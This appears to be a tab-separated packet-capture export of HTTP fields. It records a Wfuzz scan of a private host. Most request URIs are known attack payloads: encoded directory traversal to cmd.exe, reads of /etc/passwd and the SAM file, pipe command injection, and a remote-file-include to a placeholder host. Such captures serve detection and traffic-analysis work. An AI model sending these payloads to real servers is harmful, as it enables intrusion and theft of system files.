http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/cgi/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/cgi/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									26596						1,1	http://192.168.1.109/web/cgi//,http://192.168.1.109/web/cgi/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/cgi//,/web/cgi/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									26637						1,1	http://192.168.1.109/web/cgi-win/wincgi.bat/,http://192.168.1.109/web/cgi/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/cgi-win/wincgi.bat/,/web/cgi/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/cgi/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/cgi/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/cgi/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/cgi/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/cgi/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/cgi/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706,26706						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/bin/scripts/..%255c../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/buddies.blt/,http://192.168.1.109/web/blah-whatever.jsp/,http://192.168.1.109/web/catalog.nsf/,http://192.168.1.109/web/ca000007.pl?ACTION=SHOWCART&REFPAGE=\/,http://192.168.1.109/web/caupo/admin/admin_workspace.php/,http://192.168.1.109/web/cbms/passgen.php/,http://192.168.1.109/web/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=C:\WINNT\repair\sam._/,http://192.168.1.109/web/cfdocs/exampleapp/email/getfile.cfm/,http://192.168.1.109/web/cfdocs/snippets/fileexists.cfm/,http://192.168.1.109/web/cfusion/cfapps/security/data/realm.mdb/,http://192.168.1.109/web/cgi-bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi/,http://192.168.1.109/web/cgi-bin//_vti_pvt/doctodep.btr/,http://192.168.1.109/web/cgi-bin/AnyForm/,http://192.168.1.109/web/cgi-bin/FileSeek.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=/,http://192.168.1.109/web/cgi-bin/LWGate.cgi/,http://192.168.1.109/web/cgi-bin/MsmMask.exe/,http://192.168.1.109/web/cgi-bin/a1stats/a1disp3.cgi?../../../../../../../etc/passwd/,http://192.168.1.109/web/cgi-bin/WS_FTP.ini/,http://192.168.1.109/web/cgi-bin/admin/setup.cgi/,http://192.168.1.109/web/cgi-bin/aglimpse.cgi/,http://192.168.1.109/web/cgi-bin/allmanageup.pl/,http://192.168.1.109/web/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://xxxxxxxxxx//,http://192.168.1.109/web/cgi-bin/ax-admin.cgi/,http://192.168.1.109/web/cgi-bin/bb-replog.sh/,http://192.168.1.109/web/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10/,http://192.168.1.109/web/cgi-bin/cached_feed.cgi/,http://192.168.1.109/web/cgi-bin/calender.pl/,http://192.168.1.109/web/cgi-bin/cart.pl?db='/,http://192.168.1.109/web/cgi-bin/cgimail.exe/,http://192.168.1.109/web/cgi-bin/cgiwrap/~@USERS/,http://192.168.1.109/web/cgi-bin/code.php/,http://192.168.1.109/web/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html/,http://192.168.1.109/web/cgi-bin/counterfiglet/nc//,http://192.168.1.109/web/cgi-bin/csNews.cgi/,http://192.168.1.109/web/cgi-bin/date/,http://192.168.1.109/web/cgi-bin/diagnose.cgi/,http://192.168.1.109/web/cgi-bin/echo.bat?dir+c:\/,http://192.168.1.109/web/cgi-bin/environ.pl/,http://192.168.1.109/web/cgi-bin/ezman.cgi/,http://192.168.1.109/web/cgi-bin/finger.cgi/,http://192.168.1.109/web/cgi-bin/foxweb.dll/,http://192.168.1.109/web/cgi-bin/gbadmin.cgi?action=change_adminpass/,http://192.168.1.109/web/cgi-bin/gm-authors.cgi/,http://192.168.1.109/web/cgi-bin/get32.exe\dir/,http://192.168.1.109/web/cgi-bin/handler/,http://192.168.1.109/web/cgi-bin/htimage.exe/,http://192.168.1.109/web/cgi-bin/htsearch?-c/nonexistant/,http://192.168.1.109/web/cgi-bin/ikonboard/help.cgi/,http://192.168.1.109/web/cgi-bin/ikonboard/help.cgi?/,http://192.168.1.109/web/cgi-bin/jj/,http://192.168.1.109/web/cgi-bin/log//,http://192.168.1.109/web/cgi-bin/logs.pl/,http://192.168.1.109/web/cgi-bin/mailform.pl/,http://192.168.1.109/web/cgi-bin/man.sh/,http://192.168.1.109/web/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd/,http://192.168.1.109/web/cgi-bin/mt/mt-check.cgi/,http://192.168.1.109/web/cgi-bin/nph-exploitscanget.cgi/,http://192.168.1.109/web/cgi-bin/perl?-v/,http://192.168.1.109/web/cgi-bin/nph-publish.cgi/,http://192.168.1.109/web/cgi-bin/netpad.cgi/,http://192.168.1.109/web/cgi-bin/photo//,http://192.168.1.109/web/cgi-bin/post32.exe/,http://192.168.1.109/web/cgi-bin/powerup/r.cgi?FILE=../../../../../../../../../../etc/passwd/,http://192.168.1.109/web/cgi-bin/query?mss=%2e%2e/config/,http://192.168.1.109/web/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3/,http://192.168.1.109/web/cgi-bin/robpoll.cgi/,http://192.168.1.109/web/cgi-bin/redirect/,http://192.168.1.109/web/cgi-bin/search97.vts/,http://192.168.1.109/web/cgi-bin/sensepost.exe?/c+dir/,http://192.168.1.109/web/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|/,http://192.168.1.109/web/cgi-bin/snorkerz.cmd/,http://192.168.1.109/web/cgi-bin/statusconfig.pl/,http://192.168.1.109/web/cgi-bin/store/agora.cgi?page=whatever33.html/,http://192.168.1.109/web/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd/,http://192.168.1.109/web/cgi-bin/test.cgi/,http://192.168.1.109/web/cgi-bin/tpgnrock/,http://192.168.1.109/web/cgi-bin/ultraboard.cgi/,http://192.168.1.109/web/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\/,http://192.168.1.109/web/cgi-bin/virgil.cgi/,http://192.168.1.109/web/cgi-bin/webbbs.cgi/,http://192.168.1.109/web/cgi-bin/webgais/,http://192.168.1.109/web/cgi-bin/webutil.pl/,http://192.168.1.109/web/cgi-bin/wrap.cgi/,http://192.168.1.109/web/cgi-bin/wwwthreads/3tvars.pm/,http://192.168.1.109/web/cgi-local/cgiemail-1.4/cgicso?query=AAA/,http://192.168.1.109/web/cgi-shop/view_item?HTML_FILE=../../../../../../../../../../etc/passwd%00/,http://192.168.1.109/web/cgi-sys/helpdesk.cgi/,http://192.168.1.109/web/cgi-win/perl.exe/,http://192.168.1.109/web/cgi/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/bin/scripts/..%255c../winnt/system32/cmd.exe?/c+dir/,/web/buddies.blt/,/web/blah-whatever.jsp/,/web/catalog.nsf/,/web/ca000007.pl?ACTION=SHOWCART&REFPAGE=\/,/web/caupo/admin/admin_workspace.php/,/web/cbms/passgen.php/,/web/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=C:\WINNT\repair\sam._/,/web/cfdocs/exampleapp/email/getfile.cfm/,/web/cfdocs/snippets/fileexists.cfm/,/web/cfusion/cfapps/security/data/realm.mdb/,/web/cgi-bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi/,/web/cgi-bin//_vti_pvt/doctodep.btr/,/web/cgi-bin/AnyForm/,/web/cgi-bin/FileSeek.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=/,/web/cgi-bin/LWGate.cgi/,/web/cgi-bin/MsmMask.exe/,/web/cgi-bin/a1stats/a1disp3.cgi?../../../../../../../etc/passwd/,/web/cgi-bin/WS_FTP.ini/,/web/cgi-bin/admin/setup.cgi/,/web/cgi-bin/aglimpse.cgi/,/web/cgi-bin/allmanageup.pl/,/web/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://xxxxxxxxxx//,/web/cgi-bin/ax-admin.cgi/,/web/cgi-bin/bb-replog.sh/,/web/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10/,/web/cgi-bin/cached_feed.cgi/,/web/cgi-bin/calender.pl/,/web/cgi-bin/cart.pl?db='/,/web/cgi-bin/cgimail.exe/,/web/cgi-bin/cgiwrap/~@USERS/,/web/cgi-bin/code.php/,/web/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html/,/web/cgi-bin/counterfiglet/nc//,/web/cgi-bin/csNews.cgi/,/web/cgi-bin/date/,/web/cgi-bin/diagnose.cgi/,/web/cgi-bin/echo.bat?dir+c:\/,/web/cgi-bin/environ.pl/,/web/cgi-bin/ezman.cgi/,/web/cgi-bin/finger.cgi/,/web/cgi-bin/foxweb.dll/,/web/cgi-bin/gbadmin.cgi?action=change_adminpass/,/web/cgi-bin/gm-authors.cgi/,/web/cgi-bin/get32.exe\dir/,/web/cgi-bin/handler/,/web/cgi-bin/htimage.exe/,/web/cgi-bin/htsearch?-c/nonexistant/,/web/cgi-bin/ikonboard/help.cgi/,/web/cgi-bin/ikonboard/help.cgi?/,/web/cgi-bin/jj/,/web/cgi-bin/log//,/web/cgi-bin/logs.pl/,/web/cgi-bin/mailform.pl/,/web/cgi-bin/man.sh/,/web/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd/,/web/cgi-bin/mt/mt-check.cgi/,/web/cgi-bin/nph-exploitscanget.cgi/,/web/cgi-bin/perl?-v/,/web/cgi-bin/nph-publish.cgi/,/web/cgi-bin/netpad.cgi/,/web/cgi-bin/photo//,/web/cgi-bin/post32.exe/,/web/cgi-bin/powerup/r.cgi?FILE=../../../../../../../../../../etc/passwd/,/web/cgi-bin/query?mss=%2e%2e/config/,/web/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3/,/web/cgi-bin/robpoll.cgi/,/web/cgi-bin/redirect/,/web/cgi-bin/search97.vts/,/web/cgi-bin/sensepost.exe?/c+dir/,/web/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|/,/web/cgi-bin/snorkerz.cmd/,/web/cgi-bin/statusconfig.pl/,/web/cgi-bin/store/agora.cgi?page=whatever33.html/,/web/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd/,/web/cgi-bin/test.cgi/,/web/cgi-bin/tpgnrock/,/web/cgi-bin/ultraboard.cgi/,/web/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\/,/web/cgi-bin/virgil.cgi/,/web/cgi-bin/webbbs.cgi/,/web/cgi-bin/webgais/,/web/cgi-bin/webutil.pl/,/web/cgi-bin/wrap.cgi/,/web/cgi-bin/wwwthreads/3tvars.pm/,/web/cgi-local/cgiemail-1.4/cgicso?query=AAA/,/web/cgi-shop/view_item?HTML_FILE=../../../../../../../../../../etc/passwd%00/,/web/cgi-sys/helpdesk.cgi/,/web/cgi-win/perl.exe/,/web/cgi/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									26971,26971						1,1,1	http://192.168.1.109/web/cgi/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/clbusy.nsf/,http://192.168.1.109/web/cgi/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/cgi/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/clbusy.nsf/,/web/cgi/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									27010,27010						1,1,1	http://192.168.1.109/web/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini/,http://192.168.1.109/web/checkout_payment.php/,http://192.168.1.109/web/cgi/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini/,/web/checkout_payment.php/,/web/cgi/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/cgi/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/cgi/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/
